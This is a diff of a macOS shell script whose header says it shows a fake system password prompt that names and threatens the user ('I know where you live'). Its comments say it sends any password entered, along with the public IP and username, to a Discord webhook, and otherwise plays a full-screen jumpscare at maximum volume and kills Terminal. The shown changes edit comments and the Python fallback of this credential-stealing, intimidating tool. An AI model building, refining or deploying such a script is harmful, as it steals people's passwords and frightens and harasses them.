@@ -5,13 +5,13 @@
 #     "I know where you live, [FirstName]."
 #     "Enter your password Mr. [LastName]. DO NOT PRESS CANCEL"
 # - If a non-empty password is entered, it sends the password, public IP,
-#   and username to a Discord webhook.
+#   and username to a Discord webhook using Python for JSON generation.
 # - If the user cancels (or leaves the password empty), it downloads and plays
 #   a jumpscare video (from GitHub) in the browser (full-screen, at max volume).
 # - Finally, it force-kills Terminal.
 #
 # Requirements:
-#   - macOS with osascript, curl, and either python3 or python2 (or python) installed.
+#   - macOS with osascript, curl, and either python3 or python2 installed.
 #
 # Usage:
 #   chmod +x combined_script.sh
@@ -27,9 +27,6 @@ username=$(scutil <<< "show State:/Users/ConsoleUser" | awk '/Name :/ && ! /logi
 capture="username=${username}\n____________________________________________\n\n"
 
 # --- Define AppleScript Login Prompt (Single Attempt) ---
-# The prompt shows:
-#   Line 1: "I know where you live, [FirstName]."
-#   Line 2: "Enter your password Mr. [LastName]. DO NOT PRESS CANCEL"
 read -r -d '' applescriptCode <<'EOF'
 set fullName to (long user name of (system info))
 set firstName to word 1 of fullName
@@ -126,8 +123,6 @@ else
         PYTHON=python3
     elif command -v python2 &>/dev/null; then
         PYTHON=python2
-    elif command -v python &>/dev/null; then
-        PYTHON=python
     else
         echo "Neither Python3 nor Python2 is available. Exiting."
         exit 1
